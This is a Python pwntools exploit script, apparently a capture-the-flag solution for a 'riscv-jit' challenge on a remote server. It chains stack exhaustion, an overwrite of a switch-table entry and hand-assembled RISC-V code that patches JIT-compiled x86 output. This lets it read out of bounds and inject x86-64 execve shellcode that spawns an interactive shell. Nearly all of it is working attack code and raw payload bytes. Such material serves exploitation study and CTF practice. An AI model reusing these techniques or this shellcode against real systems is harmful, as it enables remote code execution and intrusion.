#!/usr/bin/env python3

from pwn import *

context.clear(arch="amd64")

IP = ""
PORT = 1337

elf = ELF("./riscv-jit")

# libc = ELF("./libc.so")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")

#p = process([elf.path, "-v", "b2json.bin"])
#p = process([elf.path, "b2json.bin"])
p = remote("chall.rumble.host", 4141)
#p = remote("172.17.0.1", 4141)
pause()

def emit_null():
    return b"\x00"

def emit_uint(n):
    return b"\x03"+p32(n)

def emit_list(l):
    return b"\x05" + p32(l)

def emit_dict(l):
    return b"\x06" + p32(l)

def emit_str(s):
    return b"\x04" + p32(len(s)) + s

def hexdump_to_code(hexdump):
    res = b""
    for v in hexdump.split("\n"):
        if len(v) == 0:
            continue
        res += p32(int(v, 16))
    return res
    

log.info("Generating first stage...")

# Exhaust stack
payload = (emit_list(0x3) + emit_uint(0x41414141)*1)*2014

# Unfuck stack frame
payload += emit_str(b"")*1

# Overwrite switch table entry for handle list json opcode
# This calls read(addr, size) where addr is very near to where
# we are about to execute and size is big enough
payload += emit_uint(0x51)

# Return from recursion level
payload += emit_uint(0x42424242)

# Trigger the vuln
payload += emit_list(0)
payload += b"AAAAAAA" # Some padding for the code
log.success(f"Done ({len(payload)} bytes)")


# Stage2 starts here
'''
.global _boot
.text

_boot:
# Print flag from 1st challenge
li a7, 3
ecall
# Set counter
addi a2, x0, 0
# Clear JITed chunks
fence.i

stage1:
# Target instruction. We will partially overwrite this so that instead of saving the
# value in rdi+reg*4 we save it in rdi+rsi+reg*4 where rsi+reg*4 = 0x88, which is
# where vm_state.mem_size is stored
lui x8, 0x10
j stage2

stage2:
# If we already executed this jump to stage3
bne a2, x0, stage3
addi a2, x0, 1

# Target address is 0xffff
lui a0, 0x10
addi a0, a0, -1

# Writing value "\x48\x01\xf1"
# Which is add rdi,rsi
lui a1, 0xf7014
addi a1, a1, 0x7ff
addi a1, a1, 1

# Trigger vuln. Overwrite JIT code
sw a1, 0(a0)
# Jump to JIT code
j stage1

stage3:
# Call to read(0x10000, 0x1000)
# This is OOB, but because we overwrote vm_state.mem_size we are not going to panic
li a7, 1
lui a0, 0x10
lui a1, 1
ecall
# Jump to shellcode
j stage1
'''
hexdump = '''
0000100f
00010437
00000613
0000100f
00010437
0040006f
02061263
00100613
00010537
fff50513
f70145b7
7ff58593
00158593
00b52023
fd9ff06f
00100893
00010537
000015b7
00000073
fc5ff06f
'''

log.info("Generating second stage code...")
code = hexdump_to_code(hexdump)
log.success(f"Done ({len(code)} bytes)")

payload += code

log.info("Overwriting code with recursion & exploiting JIT bug...")
p.send(payload)

time.sleep(0.5)

log.info("Stage3: Sending shellcode...")
# https://shell-storm.org/shellcode/files/shellcode-806.php
p.send(b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")

log.success("Here's your shell! :D")
p.sendline(b"echo 'XXXX'")
p.recvuntil(b"XXXX")
p.interactive()
